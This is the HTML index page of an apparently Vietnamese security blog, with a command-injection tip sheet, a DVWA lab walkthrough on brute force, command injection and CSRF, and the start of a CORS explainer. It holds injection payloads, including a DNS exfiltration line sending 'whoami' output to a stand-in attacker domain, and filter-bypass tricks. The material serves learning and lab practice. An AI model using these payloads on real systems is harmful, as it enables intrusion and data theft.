@@ -1,0 +1,1428 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hydrasky</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Hack to learn, Don&#96;t learn to hack">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Hydrasky">
+<meta property="og:url" content="http://blog.hydrasky.ml/index.html">
+<meta property="og:site_name" content="Hydrasky">
+<meta property="og:description" content="Hack to learn, Don&#96;t learn to hack">
+<meta property="og:locale">
+<meta property="article:author" content="Le Binh An">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hydrasky" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hydrasky</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.hydrasky.ml"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-OS command Injection" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/11/29/OS%20command%20Injection/" class="article-date">
+  <time datetime="2020-11-29T05:00:00.000Z" itemprop="datePublished">2020-11-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/11/29/OS%20command%20Injection/">Command Injection TIP</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Một số hàm API được sử để giao tiếp với hệ điều hành có thể tiềm tàng nguy cơ bị injection nếu sử dụng:</p>
+<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><ul>
+<li>Runtime.exec()<h3 id="C-C"><a href="#C-C" class="headerlink" title="C/C++"></a>C/C++</h3></li>
+<li>system</li>
+<li>exec</li>
+<li>ShellExecute</li>
+<li>ShellExecuteForExplore</li>
+<li>Shell<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3></li>
+<li>exec</li>
+<li>eval</li>
+<li>os.system</li>
+<li>os.popen</li>
+<li>subprocess.popen</li>
+<li>subprocess.call</li>
+<li>execfile</li>
+<li>input<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3></li>
+<li>passthru</li>
+<li>popen</li>
+<li>curl_exec</li>
+<li>curl_multi_exec</li>
+<li>pcntl_exec</li>
+<li>system</li>
+<li>shell_exec</li>
+<li>exec</li>
+<li>proc_open</li>
+<li>eval<h2 id="Net"><a href="#Net" class="headerlink" title=".Net"></a>.Net</h2></li>
+<li>Process.Start<h2 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h2>child_process.exec</li>
+</ul>
+<p>Một số ký tự có chức năng như dấu phân cách giữa các lệnh, cho phép các lệnh được xâu chuỗi lại với nhau. Các dấu phân tách lệnh sau hoạt động trên cả hệ thống dựa trên Windows và Uni</p>
+<ul>
+<li>&amp;</li>
+<li>&amp;&amp;</li>
+<li>|</li>
+<li>||<br>Một số chỉ sử dụng trên Unix:</li>
+<li>;</li>
+<li>Xuống dòng (0x0a or \n)</li>
+</ul>
+<p>Sử dụng để thực hiện câu lệnh kép: “echo $(ls) “= “ls”</p>
+<ul>
+<li><code></code> </li>
+<li>$( injected command )</li>
+</ul>
+<p>Một số thử thuật để khai thác hay kiểm tra lỗ hổng Blind OS Command Injection:</p>
+<ul>
+<li><p>Gửi mail bằng command</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mail -s &quot;This site is great&quot; -aFrom:peter@normal-user.net feedback@vulnerable-website.com</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Sử dụng ping để thử qua độ trễ của reponse</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; ping -c 10 127.0.0.1 &amp;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Chuyển hướng đầu ra qua một kiểu xuất dữ liệu, như tạo 1 file </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; whoami &gt; &#x2F;var&#x2F;www&#x2F;static&#x2F;whoami.txt &amp;</span><br></pre></td></tr></table></figure></li>
+<li>Sử dụng kĩ thuật OAST - dữ liệu được truy xuất bằng một kênh khác<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp; nslookup kgji2ohoyw.web-attacker.com &amp;</span><br><span class="line">&amp; nslookup $(whoami).kgji2ohoyw.web-attacker.com &amp;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="Payload-de-thuc-hien-fuzz"><a href="#Payload-de-thuc-hien-fuzz" class="headerlink" title="Payload để thực hiện fuzz:"></a>Payload để thực hiện fuzz:</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/payloadbox/command-injection-payload-list">https://github.com/payloadbox/command-injection-payload-list</a></li>
+<li><a target="_blank" rel="noopener" href="https://hackersonlineclub.com/command-injection-cheatsheet/">https://hackersonlineclub.com/command-injection-cheatsheet/</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection</a></li>
+</ul>
+<h3 id="Tham-khao-kien-thuc"><a href="#Tham-khao-kien-thuc" class="headerlink" title="Tham khảo kiến thức"></a>Tham khảo kiến thức</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/os-command-injection">https://portswigger.net/web-security/os-command-injection</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/PortSwigger/command-injection-attacker">https://github.com/PortSwigger/command-injection-attacker</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.hydrasky.ml/2020/11/29/OS%20command%20Injection/" data-id="ckik1yr7d0001esjm8ksm1pu8" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/BugBoutyTip/" rel="tag">BugBoutyTip</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-DVWA-Part1" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/11/28/DVWA-Part1/" class="article-date">
+  <time datetime="2020-11-28T05:00:00.000Z" itemprop="datePublished">2020-11-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/11/28/DVWA-Part1/">DVWA (OWASP)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>TL;DR:<br>Damn Vulnerable Web Application (DVWA) là một ứng dụng mã nguồn PHP/MySQL tập hợp sẵn các lỗi logic về bảo mật ứng dụng web trong mã nguồn PHP. Lỗi logic khi lập trình có thể áp dụng đối với các loại ngôn ngữ lập trình nhằm giảm thiểu khả năng tạo ra lổ hổng bảo mật từ tư duy lập trình chưa cẩn thận. Bản thân mk thấy DVWA rất thích hợp cho các bạn nào mới bắt đầu với pentest web. Các bạn nên hoàn thành và hiểu nó trong những bước đầu nha. </p>
+<p>Xin chào tất cả các bạn hôm nay mình quay lại với series phân tích các lỗ hổng trong các bài lab của DVWA. Để giải hầu hết các bài lab này các bạn có thể tìm thấy solution ở rất nhiều nơi như blog, youtube nhưng hầu như không ai giải thích nguyên nhân cụ thể của lỗ hổng và tại sao lại dùng payload như vậy.<br>Đối với người mới thì như vậy là cách học rất là mù mịt và máy móc. Do đó hôm nay sẽ viết series này chủ yếu để giải thích cho các bạn hiểu về lỗ hổng và cách khai thác chứ không chỉ chăm chú vào kết quả cuối cùng. Okie vào từng phần thôi nào ! À sẽ có những lỗi cơ bản nên mình xin phép sẽ không nói nhiều nha!.</p>
+<h2 id="Brute-force"><a href="#Brute-force" class="headerlink" title="Brute force"></a>Brute force</h2><p>Đây là một lỗ hổng rất dễ hiểu và khai thác, căn bản nó như kiểu không có “rate limited” - giói hạn request ,cho phép attacker gửi request liên tục mà không có bất cứ cơ chế chặn nào. Nghe thì dường như chẳng có xấu xa gì nhưng nó lại bàn đạp để leo thang thành nhiều lỗ hổng khác như chiếm tài khoản qua brute force password, mã otp ; spam ; DOS ; liệt kê danh sách bí mật … Do đó brute force vẫn luôn được coi là một lỗ hổng đáng để quan tâm.</p>
+<p>Trong DVWA, bài lab sử dụng lỗ hổng này để  chiếm tài khoản với 4 mức easy, medium , high và Impossible .<br><img src="/images/DVWA/bruteforce1.png" class="[class names]" title="[500] [500] " alt="title text"></p>
+<h4> Level Easy + Medium </h4> 
+
+<img src="/images/DVWA/bruteforce2.png" class="[class names]" title="[500] [500] " alt="Easy lab">
+<p>Đầu tiên ta có thể thấy 2 lỗ hỗng là SQL injection và Bruteforce nhưng ở đây ta chỉ cần quan tâm đến BF thui. Điều dễ thấy ở đây là phần “check the database “ đã gửi đi query và chẳng có gì để giới hạn request cả lúc này chỉ đơn là sử dụng 1 công cụ nào đó để bruteforce các username và password có thể .</p>
+<p>Chuyển sang Medium thì cũng không có gì thêm ngoại việc bổ sung hàm loại bỏ các kí tự đặc biệt trong giá trị truyền vào (mysqli_real_escape_string) của usernamr và password để chặn SQLi. Do đó vẫn brute force bình thường.</p>
+<img src="/images/DVWA/bruteforce3.png" class="[class names]" title="[500] [500] " alt="Medium lab">
+<h4> Level High </h4>
+
+<p>Mức này bổ sung thêm 1 chút an toàn đó là csrf token </p>
+<img src="/images/DVWA/bruteforce5.png" class="[class names]" title="[500] [500] " alt="High lab">
+<p>và check nó bằng hàm checkToken()- hàm này tự tạo không có trong thư viện nào của PHP.</p>
+<img src="/images/DVWA/bruteforce4.png" class="[class names]" title="[500] [500] " alt="High lab">
+<img src="/images/DVWA/bruteforce6.png" class="[class names]" title="[500] [500] " alt="High lab">
+<p>Hàm này sẽ kiểm tra các giá trị “user_token”- trên URL và “session_token”-trong cookie của request nhận được nếu 2 giá trị này bằng nhau thì request này mới được coi là hợp còn không sẽ redirect về trang “index.php”.<br>Qúa dởm đúng không các bạn (^^) , csrftoken không xác thực lại đi xác thực cái mẹ gì ko ?<br>Điều này rất dễ bypass bằng cách attacker chỉ cần cho giá trị của user_token là bất kì và thêm vào cookie một field là session_token với giá trị là user_token vừa đặt là xong.Thế là bạn lại tiếp tục có thể bruteforce.</p>
+<h4> Level Impossible </h4> 
+
+<p>Đúng với cái tên, Mức này thực chât không phải để chúng ta khai thác mà là cho chúng ta thấy cách lập trình an toàn đầy đủ để phòng tránh lỗ hổng này. O đây ta có thể thấy họ đã bổ sung thêm một số an toàn như sau:</p>
+<img src="/images/DVWA/bruteforce7.png" class="[class names]" title="[500] [500] " alt="Impossible lab">
+<p> Các giá trị đếm số lần đăng nhập sai, thời gian khóa tài khoản , tài khoản có bị khóa hay không và hàm kiểm tra các giá trị đó.</p>
+ <img src="/images/DVWA/bruteforce8.png" class="[class names]" title="[500] [500] " alt="High lab">
+<p>Bên canh đó còn sét thời gian trễ sau mỗi lần đăng nhập sai và cập nhật vào cơ sỡ dữ liệu ngay.<br>… (Bạn nên tự đọc thêm sourcecode mức này dể hiểu)</p>
+<p>Ngoài ra bạn có thể tự thêm tính năng hủy session sau một khoảng thời gian cũng là một biện pháp hay …</p>
+<p>##Command Injection</p>
+<p>Command injection là một lỗ hổng rất là nghiêm trọng , thuộc các lỗ hổng của RCE,  attacker có thể chèn các payload là các câu lệnh của hệ thống thông qua các đầu vào và thực thi nó từ xa. Bạn có  thể nhầm lẫn với một họ hàng của nó là Code Injection nhưng thực chất là nó khác nhau đó. Nhưng chỉ cần hiểu đơn giản là command chỉ chèn lệnh còn Code thì chèn code (function). Lỗ hổng này xảy ra do phần xử lí phía backend, với các ngôn ngữ có thể giao tiếp với hệ thống như PHP, JAVA, PYTHON …. và bất cứ hệ điều hành nào Windows/Linux/Unix/Mac</p>
+<img src="/images/DVWA/cmdinjecton1.png" class="[class names]" title="[500] [500] " alt=" ">
+<p>O trong bài lab này chúng ta sẽ thực hiện khai thác lỗ hổng này trên Linux Server và ngôn ngữ được sử dụng lúc này là PHP. Bổ sung thêm cho mọi người luôn là PHP cung cấp rất nhiều hàm để thực thi lệnh trên hệ thống như system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source.</p>
+<h4> Level Easy + Medium </h4>
+
+<img src="/images/DVWA/cmdinjecton2.png" class="[class names]" title="[500] [500] " alt=" ">
+<p>Nêu như bạn hiểu được đoạn code này thì thấy nó rất dễ để khai thác</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$target &#x3D; $_REQUEST[ &#39;ip&#39; ] &#x3D;&gt; shell_exec( &#39;ping  &#39; . $target ) &#x3D;&gt; RCE</span><br></pre></td></tr></table></figure>
+<p>Hàm shell_exec() [giống như exec() nhưng nó trả về dữ liệu dạng string] thực thi cấu lênh “ ping [input] “và trả về kết quả. Lúc này chúng ta có thê thấy họ truyền trực tiếp giá trị của “IP” vào “ping [IP]” như vậy phải tìm cách chèn thêm câu lệnh thông qua “input” đó và hệ điều hành cung cho phép thực thi câu lệnh trong 1 lần nhập (ping 8.8.8.8 &amp;&amp; whoami) bằng rất nhiều cách như  :</p>
+<ul>
+<li>Nối 2 câu lệnh bằng  <ul>
+<li>&amp;</li>
+<li>&amp;&amp;</li>
+<li>|</li>
+<li>||</li>
+</ul>
+</li>
+<li>Trên hệ điều hành Unix có thể sử dụng :<ul>
+<li>;</li>
+<li>Xuống dòng (0x0a or \n)</li>
+</ul>
+</li>
+</ul>
+<img src="/images/DVWA/cmdinjecton3.png" class="[class names]" title="[500] [500] " alt=" ">
+<p>Okie như vậy chắc chắn bạn đã hiểu cách để khai thác các bài lab như này rồi đúng không !</p>
+<img src="/images/DVWA/cmdinjecton4.png" class="[class names]" title="[500] [500] " alt=" ">
+<p>Đối với những bài hay như này bạn có thể enable PHPIDS để tăng thêm phần khó và kịch tính để tăng level của bạn.</p>
+<h4> Level Medium </h4><br>Mức này họ thêm blacklist để loại bỏ các kí tự đặc biệt để chèn thêm command nhưng như bạn thấy nó vẫn thiếu quá nhiều do đó bạn chỉ cần dùng các kí tự không nằm trong black là bypass được hoặc sử dụng cách encode kí tự là xong.<br><br><img src="/images/DVWA/cmdinjecton5.png" class="[class names]" title="[500] [500] " alt=" "><br><br><h4> Level High </h4>
+
+<p>O mức này nhìn thấy danh sách có vẻ đầy đủ đó nhưng lại bị sai 1 thứ :<br><img src="/images/DVWA/cmdinjecton6.png" class="[class names]" title="[500] [500] " alt=" "></p>
+<p>Dễ như ăn cơm , bh chúng ta chỉ cần sử dụng payload “|id” - Ko dấu cách nha!!!! Done</p>
+<img src="/images/DVWA/cmdinjecton7.png" class="[class names]" title="[500] [500] " alt=" ">
+<h4> Level Impossible </h4>
+
+<p>Chúng ta cùng xem cách lập trình an toàn cho bài này như thế nào nha</p>
+<img src="/images/DVWA/cmdinjecton8.png" class="[class names]" title="[500] [500] " alt=" ">
+<ul>
+<li>Họ đã sử dụng hàm stripslashes() để lọc các kí tự gạch chéo trong giá trị truyền vào ,ví dụ “C:\user\config.php” =&gt; “C:userconfig.php”</li>
+<li>Sử dụng hàm explode() để phân tách chuỗi giá trị đầu vào theo dấu “.” ( Giống với preg_split nhưng không linh hoạt bằng ) thành một mảng các giá trị và tiến hành kiểm tra xem có phải là các số hay không “is_numeric()” ? Nhưng vậy là đã tránh được việc truyền các câu lệnh bằng chữ rồi và cũng chẳng có câu lệnh nào là toàn số cả trừ khi bạn thiết lập thành alias.</li>
+</ul>
+<p>Đây là cách fix nhưng mình thấy cơ bản thì chỉ ap dụng cho bài này chứ thực tế để ngăn chặn command injection thì sẽ cần phải mở rộng hơn.</p>
+<p>##CSRF</p>
+<p>CSRF ( Cross Site Request Forgery) là kĩ thuật tấn công bằng cách sử dụng quyền chứng thực của người sử dụng đối với 1 website khác. Các ứng dụng web hoạt động theo cơ chế nhận các câu lệnh HTTP từ người sử dụng, sau đó thực thi các câu lệnh này. Mk có viêt một bài riêng về lỗ hổng này các bạn có thể tham khảo. Lỗ hổng này thường ở các yêu cầu submit hoặc API, mức độ nguy hiểm thì cũng tùy thuộc vào target mà request hướng đến.Nguy hiểm nhất vẫn thường là dùng để chiếm tài khoản, chuyển tiền, yêu cầu xác thực …</p>
+<img src="/images/DVWA/csrf1.png" class="[class names]" title="[500] [500] " alt=" ">
+<p>Trong bài lab lần này ta sẽ cố gắng chiếm tài khoản của admin  bằng cách đổi password thông qua lỗ hổng CSRF. Những ai hểu lỗ hổng này rồi sẽ biêt cách khai thác ngay lập tức còn chưa thì lên đọc qua tài liệu chứ mình sẽ không giải thích cụ thể trong bài viết này đâu .</p>
+<ul>
+<li>Level Low dễ quá rồi không cơ chế an toàn nào ở đây cả nên mk không giải thích cách khai thác nữa.</li>
+<li><p>Sang level Medium, thì có bổ sung thêm check HTTP referer - <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer">Header của HTTP request</a> , cách này trước đây khá hay dùng nhưng bh thì không vì nó quá dễ để bypass. Nó tiến hành kiểm tra xem giá trị của 2 header “Host” và “Referer” có giống nhau hay không? </p>
+<img src="/images/DVWA/csrf2.png" class="[class names]" title="[500] [500] " alt=" ">
+</li>
+<li><p>Level High, giống hệt bài bruteforce 3 đó là sử dụng hàm checkToken() lởm </p>
+<img src="/images/DVWA/csrf3.png" class="[class names]" title="[500] [500] " alt=" ">
+</li>
+</ul>
+<h4>Level Impossible</h4>
+
+<p>Cách ngăn chặn CSRF trong đổi mật khẩu tốt nhất bây giờ mình thấy đó vẫn là sử dụng xác thực bằng mật khẩu cũ, Sử dụng CSRFtoken cũng là một cách hay nhưng đôi khi lại lỗi trong việc lập trình dẫn đến unsecure flow.<br>Việc sủ dụng mật khẩu cũ kết hợp với CSRF Token để xác thực ngày nay giống như một tiêu chuẩn được đề ra vậy.</p>
+<img src="/images/DVWA/csrf4.png" class="[class names]" title="[500] [500] " alt=" ">
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.hydrasky.ml/2020/11/28/DVWA-Part1/" data-id="ckik1yr770000esjm8e2tbe55" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Lab/" rel="tag">Lab</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-CORS" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/07/23/CORS/" class="article-date">
+  <time datetime="2020-07-23T04:00:00.000Z" itemprop="datePublished">2020-07-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/23/CORS/">Cross-Origin Resource Sharing</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p> TL;DR<br> Trước khi nói về C0RS, Mk muốn nói lại một chút về Cross-Origin access. Như trong phần trước về SOP mình cũng đã trình bày, việc các request đến các tài nguyên giữa các nguồn (Origin ) khác nhau được gọi là Cross-Origin.</p>
+<p> Ví dụ, web hydrasky.ml tạo một request lấy ảnh từ web hydrasky.com</p>
+<p>Vì lý do bảo mật, các trình duyệt hạn chế cho phép Cross-Origin bằng chính sách cùng nguồn gốc (SOP). Nhưng cái gì cũng có ngoại lệ, trong một số trường hợp bạn muốn chia sẻ các dữ liệu cho các Origin tin cậy thì bạn có thể sử dụng CORS để làm điều này.Tuy nhiên, nó lại mở cánh cửa cho một số cuộc tấn công dựa Cross-Origin nếu chính sách CORS của trang web được cấu hình và triển khai kém. Ok chúng ta cùng tìm hiểu sâu nào !</p>
+<h2 id="CORS-la-gi"><a href="#CORS-la-gi" class="headerlink" title="CORS là gì ?"></a>CORS là gì ?</h2><p> CORS viết tắt của Cross-Origin Resource Sharing, là một cơ chế của trình duyệt cho phép truy cập có kiểm soát vào các tài nguyên nằm ở các Origin khác nhau. Bởi vì có chính sách cùng nguồn gốc (SOP) nên mới sinh ra CORS, nó giúp mở rộng và thêm tính linh hoạt cho SOP.</p>
+<h2 id="Cach-CORS-lam-viec"><a href="#Cach-CORS-lam-viec" class="headerlink" title="Cách CORS làm việc ?"></a>Cách CORS làm việc ?</h2><p>Sẽ có 2 kịch bản chính có khả năng xảy ra để xem cách CORS hoạt động. Trong các ví dụ dưới đây sẽ sử dụng XMLHttpRequest để thực hiện gửi request , môi trường thực hiện sẽ là chung, không phân biệt các trình duyệt nào.</p>
+<h4 id="Kich-ban-1-Request-don-gian"><a href="#Kich-ban-1-Request-don-gian" class="headerlink" title="Kịch bản 1: Request đơn giản"></a>Kịch bản 1: Request đơn giản</h4><p> Một request đơn giản ở đây phải đầy đủ các điều kiện sau :</p>
+<ul>
+<li>Sử dụng một trong các phương thức sau :<ul>
+<li>GET</li>
+<li>POST</li>
+<li>HEAD</li>
+</ul>
+</li>
+<li>Ngoài các header được đặt tự động bởi các tác nhân như Connection , User-Agent hay các header nằm trong danh sách các <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name#:~:text=A%20forbidden%20header%20name%20is,retains%20full%20control%20over%20them.">Forbidden header name</a> cho Fetch API thì chỉ cho phép bạn set thủ công các header nằm trong danh sách <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Glossary/CORS-safelisted_request_header">CORS-safelisted request header</a>, ví dụ như :<ul>
+<li>Accept</li>
+<li>Accept-Language</li>
+<li>Content-Language</li>
+<li>Content-Type </li>
+</ul>
+</li>
+<li>Chỉ sử dụng các value sau đây cho Content-Type header:<ul>
+<li>application/x-www-form-urlencoded</li>
+<li>multipart/form-data</li>
+<li>text/plain</li>
+</ul>
+</li>
+<li>Không sử dụng <strong>ReadableStream</strong> object trong request.</li>
+<li>Không có bất kì trình lắng nghe sự kiện nào được đăng ký trên bất kỳ  <strong>XMLHttpRequestUpload</strong> object nào được sử dụng trong request.</li>
+</ul>
+<p>Ví dụ : Trên <a target="_blank" rel="noopener" href="https://hydrasky.ml/">https://hydrasky.ml</a> thực hiện một reuqest đơn giản đến hydrasky.com </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">const url &#x3D; &#39;https:&#x2F;&#x2F;hydrasky.com&#x2F;resources&#x2F;public-data&#x2F;&#39;;  </span><br><span class="line">xhr.open(&#39;GET&#39;, url);</span><br><span class="line">xhr.onreadystatechange &#x3D; someHandler;</span><br><span class="line">xhr.send(); </span><br></pre></td></tr></table></figure>
+
+<p>Điều này sẽ thực hiện một trao đổi đơn giản giữa máy khách và máy chủ, CORS sẽ xử lí như sau:</p>
+<img src="/images/CORS/simple-req-updated.png" class="[class names]" title="[500] [500] " alt="title text">
+
+<p>Phía Client (Browser) sẽ gửi một GET request đến tài nguyền của một ORIGIN nào đó trên server , Origin header được đính kèm với request để nói cho server biết nơi đang yêu cầu tải tài nguyên đó.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Origin: https:&#x2F;&#x2F;foo.example</span><br></pre></td></tr></table></figure>
+<p>Khi CORS được kích hoạt, nếu nhận được một request đơn giản thì Server sẽ phản hồi về với <strong>Access-Control-Allow-Origin</strong> header.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br></pre></td></tr></table></figure>
+<p>Nếu value là *<em>“ * “*</em> như ở trên thì điểu đó có nghĩa là tài nguyên đó có thể được yêu cầu bởi bất kì ORIGIN nào. Nếu như bạn muốn chỉ cho phép một ORIGIN cụ thể nào đó thì có thể set :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: https:&#x2F;&#x2F;foo.example</span><br></pre></td></tr></table></figure>
+<p>Như vậy sẽ an toàn hơn.</p>
+<h4 id="Kich-ban-2-Preflighted-Request"><a href="#Kich-ban-2-Preflighted-Request" class="headerlink" title="Kịch bản 2: Preflighted Request"></a>Kịch bản 2: Preflighted Request</h4><p>Preflighted có nghĩa là “được chiếu trước”, nếu dùng tên tiếng việt thì nghe không xuôi lắm đúng không các bạn vì vậy mình sẽ để nguyên là Preflighted Request. Việc “ Chiếu trước “ ở đây là nó ám chỉ việc browser gửi một <strong>OPTIONS</strong> request để hỏi thăm trước khi thực hiện request sau đó. Tại sao lại như vậy ?</p>
+<p>Đầu tiên bạn cần phải biết,để Prefighted request thì bao gồm những điều kiện gì :</p>
+<img src="/images/CORS/CORS1.png" class="[class names]" title="[500] [500] " alt="title text">
+
+<p>Một ví dụ request dưới đây sẽ được Preflighted  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;POST&#39;, &#39;https:&#x2F;&#x2F;hydrasky.ml&#x2F;resources&#x2F;post-here&#x2F;&#39;);</span><br><span class="line">xhr.setRequestHeader(&#39;X-PINGOTHER&#39;, &#39;pingpong&#39;);</span><br><span class="line">xhr.setRequestHeader(&#39;Content-Type&#39;, &#39;application&#x2F;xml&#39;);</span><br><span class="line">xhr.onreadystatechange &#x3D; handler;</span><br><span class="line">xhr.send(&#39;&lt;person&gt;&lt;name&gt;Arun&lt;&#x2F;name&gt;&lt;&#x2F;person&gt;&#39;);</span><br></pre></td></tr></table></figure>
+<p>Nhìn vào ví dụ có thể thấy, <strong>Conttent-Type</strong> được đặt là <strong>application/xml</strong> và một header tự tạo là <strong>X-PINGOTHER</strong> được set trong request ==&gt;  <strong>Preflighted</strong>.</p>
+<p>Điều này sẽ thực hiện một cuộc thăm dò giữa máy khách và máy chủ, CORS sẽ xử lí như sau:</p>
+<img src="/images/CORS/CORS2.png" class="[class names]" title="[500] [500] " alt="title text">
+
+<p>Đầu tiên trình , Browser sẽ tiến hành gửi <strong>OPTIONS</strong> request với các header được đính kèm trong POST request được thiết lập. Server sẽ gửi lại các thông tin về các thành phần trong header được cho phép thông qua <strong>Response</strong> với các Response header sau :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Access-Control-Allow-Methods: POST, GET, OPTIONS</span><br><span class="line">Access-Control-Allow-Headers: X-PINGOTHER, Content-Type</span><br><span class="line">Access-Control-Max-Age: 86400</span><br></pre></td></tr></table></figure>
+<p>Browser sẽ tiếng hành kiểm tra request đã được thiết lập, nếu request hợp lệ sẽ gửi nó tới Server.</p>
+<p>Mục đích chính của Prefligted là để xác định xem yêu cầu thực tế có an toàn để gửi hay không, vì một số yêu cầu từ các ORIGIN khác có thể liên quan đến dữ liệu người dùng. </p>
